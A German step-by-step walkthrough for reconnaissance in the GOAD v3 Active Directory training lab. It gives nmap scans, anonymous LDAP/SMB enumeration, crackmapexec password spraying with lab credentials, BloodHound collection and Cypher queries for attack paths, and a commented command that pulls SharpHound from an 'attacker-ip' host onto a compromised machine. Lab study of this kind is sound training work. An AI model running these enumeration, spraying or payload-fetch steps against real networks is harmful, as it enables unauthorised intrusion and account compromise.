# GOAD v3 Lab - Phase 1: Reconnaissance mit BloodHound

## Schritt-für-Schritt Anleitung für die erste Phase der Cyber Kill Chain

---

## Voraussetzungen

### GOAD Lab Setup (Version 3)
- **5 VMs**: kingslanding, winterfell, castelblack, meereen, braavos
- **3 Domains**: sevenkingdoms.local, north.sevenkingdoms.local, essos.local  
- **2 Forests**: sevenkingdoms.local und essos.local
- **Netzwerk**: 192.168.56.0/24 (Standard GOAD v3 Subnetz)

### Angreifer-System
- **Kali Linux** oder vergleichbare Pentesting-Distribution
- **BloodHound CE 4.3.1** oder neuer
- **Neo4j** Database
- **Python3** mit impacket, bloodhound-python
- **Netzwerkzugriff** auf das GOAD Lab

---

## Schritt 1: Initiale Netzwerkerkennung

### 1.1 Netzwerk-Scan
```bash
# Ping-Sweep (falls ICMP erlaubt)
nmap -sn 192.168.56.0/24

# TCP SYN Scan ohne Ping (empfohlen für Windows Server mit Defender)
nmap -Pn -sS 192.168.56.0/24 -p 22,53,80,88,135,139,389,445,636,3389,5985,5986

# Detaillierter Service-Scan der gefundenen Hosts
nmap -Pn -sV -sC -p- 192.168.56.10,11,12,22,23 --open
```

**Erwartete Hosts (GOAD v3):**
- `192.168.56.10` - kingslanding.sevenkingdoms.local (DC01)  
- `192.168.56.11` - winterfell.north.sevenkingdoms.local (DC02)
- `192.168.56.12` - castelblack.north.sevenkingdoms.local (SRV02)
- `192.168.56.22` - meereen.essos.local (DC03)
- `192.168.56.23` - braavos.essos.local (SRV03)

### 1.2 Domain Controller Identifikation
```bash
# DNS-Enumeration für alle gefundenen Server
dig @192.168.56.10 sevenkingdoms.local ANY
dig @192.168.56.11 north.sevenkingdoms.local ANY  
dig @192.168.56.22 essos.local ANY

# LDAP-Enumeration ohne Credentials
ldapsearch -x -h 192.168.56.10 -s base namingcontexts
ldapsearch -x -h 192.168.56.11 -s base namingcontexts
ldapsearch -x -h 192.168.56.22 -s base namingcontexts
```

---

## Schritt 2: BloodHound Setup und Vorbereitung

### 2.1 BloodHound Installation
```bash
# Neo4j Installation
sudo apt update && sudo apt install neo4j

# Neo4j Datenbank starten
sudo systemctl start neo4j
sudo systemctl enable neo4j

# BloodHound CE Installation (falls nicht vorhanden)
wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
chmod +x BloodHound

# Bloodhound-Python Installation
pip3 install bloodhound-python
```

### 2.2 Neo4j Konfiguration
```bash
# Neo4j Web Interface: http://localhost:7474
# Default Login: neo4j/neo4j (beim ersten Start neues Passwort setzen)

# Optional: Neo4j Remote-Zugriff aktivieren
sudo nano /etc/neo4j/neo4j.conf
# Uncomment: dbms.default_listen_address=0.0.0.0
sudo systemctl restart neo4j
```

---

## Schritt 3: Datensammlung ohne Credentials (Passive Reconnaissance)

### 3.1 Bloodhound-Python (Remote Collection)
```bash
# Versuche anonyme LDAP-Bindung (oft erfolgreich)
bloodhound-python -u '' -p '' -d sevenkingdoms.local -dc kingslanding.sevenkingdoms.local -c all --dns-tcp

# Für alle drei Domains
bloodhound-python -u '' -p '' -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local -c all --dns-tcp
bloodhound-python -u '' -p '' -d essos.local -dc meereen.essos.local -c all --dns-tcp
```

### 3.2 Null Session Enumeration
```bash
# SMB Null Sessions testen
smbclient -L //192.168.56.10 -N
smbclient -L //192.168.56.11 -N  
smbclient -L //192.168.56.12 -N
smbclient -L //192.168.56.22 -N
smbclient -L //192.168.56.23 -N

# RPC Null Sessions
rpcclient -U '' -N 192.168.56.10
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> querydominfo
rpcclient> quit
```

### 3.3 LDAP Anonyme Abfragen
```bash
# Domain-Informationen sammeln
ldapsearch -x -h 192.168.56.10 -b "DC=sevenkingdoms,DC=local" "(objectclass=*)" | head -50

# User-Enumeration (falls anonyme Bindung erlaubt)
ldapsearch -x -h 192.168.56.10 -b "CN=Users,DC=sevenkingdoms,DC=local" "(objectclass=user)" sAMAccountName

# Group-Enumeration
ldapsearch -x -h 192.168.56.10 -b "DC=sevenkingdoms,DC=local" "(objectclass=group)" cn member
```

---

## Schritt 4: Mit schwachen/Standard Credentials

### 4.1 Standard Account Testing
```bash
# Teste bekannte schwache/default Accounts aus GOAD
crackmapexec smb 192.168.56.0/24 -u 'guest' -p '' --continue-on-success
crackmapexec smb 192.168.56.0/24 -u 'anonymous' -p '' --continue-on-success

# GOAD-spezifische schwache Accounts
crackmapexec smb 192.168.56.0/24 -u 'hodor' -p 'hodor' --continue-on-success
crackmapexec smb 192.168.56.0/24 -u users.txt -p passwords.txt --continue-on-success
```

**GOAD v3 bekannte schwache Credentials:**
- `hodor:hodor` (Password = Username)
- `rickon.stark:Winter2019` (Password Spraying Pattern)

### 4.2 Authenticated BloodHound Collection
```bash
# Mit gefundenen Credentials BloodHound ausführen
bloodhound-python -u hodor -p hodor -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local -c all --dns-tcp

# Alternative: SharpHound von Windows-System (wenn RDP/WinRM möglich)
evil-winrm -i 192.168.56.12 -u hodor -p hodor
# Auf dem System:
# curl -o SharpHound.exe http://attacker-ip/SharpHound.exe
# .\SharpHound.exe -c all -d north.sevenkingdoms.local
```

---

## Schritt 5: BloodHound Datenanalyse

### 5.1 JSON-Daten Import
```bash
# BloodHound starten
./BloodHound

# JSON-Files per Drag & Drop in BloodHound ziehen
# Oder über UI: "Upload Data" -> ZIP-Files auswählen
```

### 5.2 Initiale Cypher Queries für GOAD v3

#### Wichtige Benutzer identifizieren
```cypher
// Domain Admins aller Domains
MATCH (n:User)-[:MemberOf*1..]->(g:Group) 
WHERE g.name CONTAINS 'DOMAIN ADMINS' 
RETURN n.name, g.name

// High-Value Targets
MATCH (u:User) WHERE u.highvalue=true RETURN u.name, u.displayname

// Service Accounts (Kerberoasting Targets)
MATCH (n:User) WHERE n.hasspn=true RETURN n.name, n.serviceprincipalnames
```

#### GOAD-spezifische Angriffsziele
```cypher
// ASREPRoastable Users (brandon.stark, missandei)
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name

// Unconstrained Delegation (sansa.stark)  
MATCH (c:Computer) WHERE c.unconstraineddelegation=true RETURN c.name

// GenericAll/GenericWrite Rechte
MATCH p=(n)-[r:GenericAll|GenericWrite]->(m) RETURN p LIMIT 25
```

#### Privilege Escalation Pfade
```cypher
// Kürzeste Pfade zu Domain Admin (alle Domains)
MATCH (u:User {name:"HODOR@NORTH.SEVENKINGDOMS.LOCAL"}), 
      (g:Group) WHERE g.name CONTAINS 'DOMAIN ADMINS'
MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p

// Cross-Domain Trusts und Angriffspfade
MATCH (n:Domain)-[r:TrustedBy]->(m:Domain) RETURN n.name, r, m.name
```

#### MSSQL & Lateral Movement
```cypher
// MSSQL-Links (castelblack -> braavos)
MATCH p=(c:Computer)-[r:SQLAdmin]->(s:Computer) RETURN p

// RDP-Rechte pro Domain
MATCH p=(u:User)-[r:CanRDP]->(c:Computer) RETURN u.name, c.name
```

### 5.3 Spezielle GOAD v3 Angriffspfade identifizieren

#### Cross-Forest Gruppen
```cypher
// AcrossTheSea, DragonsFriends, Spys Gruppen
MATCH (g:Group) WHERE g.name CONTAINS 'ACROSS' OR g.name CONTAINS 'DRAGONS' OR g.name CONTAINS 'SPYS' 
RETURN g.name, g.domain

// Mitglieder der Cross-Forest Gruppen
MATCH (u:User)-[:MemberOf]->(g:Group) 
WHERE g.name CONTAINS 'ACROSS' OR g.name CONTAINS 'DRAGONS' 
RETURN u.name, g.name
```

#### GPO-Schwachstellen
```cypher
// GPO-Abuse Möglichkeiten (STARKWALLPAPER GPO)
MATCH (u:User)-[r:GenericWrite|WriteDacl]->(g:GPO) RETURN u.name, r.isacl, g.name

// Computer mit anfälligen GPOs
MATCH p=(u:User)-[r]->(g:GPO)-[r2:GpLink]->(ou:OU) RETURN p LIMIT 10
```

---

## Schritt 6: Reconnaissance Report erstellen

### 6.1 Erkenntnisse dokumentieren
```bash
# Export wichtiger Queries als CSV
# In BloodHound: Query ausführen -> "Export" -> CSV

# Screenshots von wichtigen Attack Paths
# BloodHound: Path anzeigen -> Screenshot speichern
```

### 6.2 GOAD v3 Reconnaissance Zusammenfassung

**Identifizierte Domains:**
- sevenkingdoms.local (Haupt-Forest)
- north.sevenkingdoms.local (Child-Domain)  
- essos.local (Separater Forest mit Trust)

**Kritische Schwachstellen gefunden:**
1. **Schwache Passwords**: hodor:hodor, rickon.stark:Winter2019
2. **Kerberoasting**: jon.snow (SPN vorhanden)
3. **ASREPRoasting**: brandon.stark, missandei
4. **Unconstrained Delegation**: sansa.stark
5. **MSSQL Links**: castelblack -> braavos via jon.snow
6. **GPO-Abuse**: STARKWALLPAPER GPO (samwell.tarly)
7. **Cross-Forest Trusts**: Angriffspfade zwischen Forests

**Nächste Schritte (Phase 2 - Weaponization):**
- Kerberoasting Angriff auf jon.snow vorbereiten
- ASREPRoast Tools für brandon.stark/missandei
- NTLM Relay Attack gegen eddard.stark (Bot alle 5min)
- MSSQL Linked Server Exploitation vorbereiten

---

## Schritt 7: Automatisierung für kontinuierliche Reconnaissance

### 7.1 Session Loop Collection
```bash
# Kontinuierliche Session-Sammlung (für bewegende Targets)
# Auf kompromittiertem System:
.\SharpHound.exe --CollectionMethods Session --Loop --Loopduration 02:00:00 --LoopInterval 00:10:00
```

### 7.2 Monitoring Script
```bash
#!/bin/bash
# goad-recon-monitor.sh
while true; do
    echo "[$(date)] Starting GOAD reconnaissance sweep..."
    
    # Neue BloodHound Daten sammeln
    bloodhound-python -u hodor -p hodor -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local -c Session --dns-tcp
    
    # Neue Daten in BloodHound importieren
    # (Manuell oder via Neo4j REST API)
    
    echo "[$(date)] Reconnaissance sweep completed. Sleeping 15 minutes..."
    sleep 900
done
```

---

## Troubleshooting & Häufige Probleme

### Problem: Keine Daten von bloodhound-python
**Lösung:**
```bash
# DNS-Server explizit angeben
bloodhound-python -u hodor -p hodor -d north.sevenkingdoms.local -dc 192.168.56.11 -ns 192.168.56.11 -c all

# Alternative: Authentifizierung mit Hash statt Passwort
bloodhound-python -u hodor --hashes :NTLMHASH -d north.sevenkingdoms.local -dc 192.168.56.11 -c all
```

### Problem: BloodHound zeigt keine Pfade
**Lösung:**
```bash
# Mehr Session-Daten sammeln
.\SharpHound.exe --CollectionMethods Session --Loop

# Alle Collection Methods verwenden
.\SharpHound.exe -c all,GPOLocalGroup
```

### Problem: Kein Zugriff auf Domain Controller
**Lösung:**
```bash
# Firewalls/Defender können Queries blockieren
# Versuche mit anderen Ports/Protokollen:
bloodhound-python -u user -p pass -d domain.local -dc dc-ip --dns-tcp --disable-pooling
```

---

## Zusammenfassung Phase 1

✅ **Abgeschlossen:**
- Netzwerk-Enumeration aller 5 GOAD Hosts
- Domain-Struktur und Trusts identifiziert  
- BloodHound Datensammlung erfolgreich
- Kritische Angriffspfade in allen 3 Domains gefunden
- Cross-Forest Schwachstellen erkannt

🎯 **Nächste Phase (Weaponization):**
- Exploit-Tools für identifizierte Schwachstellen vorbereiten
- Kerberoasting/ASREPRoast Attacks entwickeln  
- NTLM Relay und Responder Setup
- MSSQL Exploitation Scripts

**Erkannte Attack Vectors für GOAD v3:**
1. Password Spraying → Initial Foothold
2. Kerberoasting → Service Account Compromise  
3. ASREPRoasting → User Account Compromise
4. MSSQL Trusted Links → Lateral Movement
5. GPO Abuse → Privilege Escalation
6. Cross-Forest Trust Abuse → Full Forest Compromise